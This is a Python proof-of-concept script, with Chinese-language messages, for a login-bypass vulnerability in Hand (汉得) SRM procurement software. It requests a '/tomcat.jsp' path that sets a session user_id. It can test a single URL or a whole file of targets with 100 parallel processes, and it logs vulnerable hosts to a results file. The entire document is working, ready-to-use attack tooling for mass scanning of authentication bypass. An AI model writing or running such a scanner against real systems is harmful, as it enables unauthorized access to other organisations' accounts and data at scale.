import requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.pool import Pool
def banner():
    banner = """欢迎使用汉得SRM登录绕过脚本"""
    print(banner)

def poc(target):
    payload = "/tomcat.jsp?dataName=user_id&dataValue=1"
    try:
        result = requests.get(url=target,verify=False,timeout=5)
        if result.status_code == 200:
            result1 = requests.get(url=target+payload,verify=False,timeout=5)
            content = result1.text
            #print(content)
            if "user_id" in content:
                print(f"[+]{target}存在汉得SRM登录绕过漏洞")
                with open("汉得_result.txt","a",encoding="utf-8")as f:
                    f.write(f"{target}存在汉得SRM登录绕过漏洞\n")
            else:
                print(f"[-]{target}不存在汉得SRM登录绕过漏洞")
        else:
            print(f"[-]{target}无法访问")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser("汉得SRM登录绕过脚本")
    parser.add_argument("-u","--url",dest="url",type=str,help="目标url")
    parser.add_argument("-f","--file",dest="file",type=str,help="目标url文件")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
         url_list = []
         with open(args.file,"r",encoding="utf-8") as f:
             for url in f.readlines():
                 url_list.append(url.strip().replace("\n",""))
             mp = Pool(100)
             mp.map(poc,url_list)
             mp.close()
             mp.join()

    else:
        print(f"参数错误,请使用-h查看帮助")

if __name__ == "__main__":
    main()

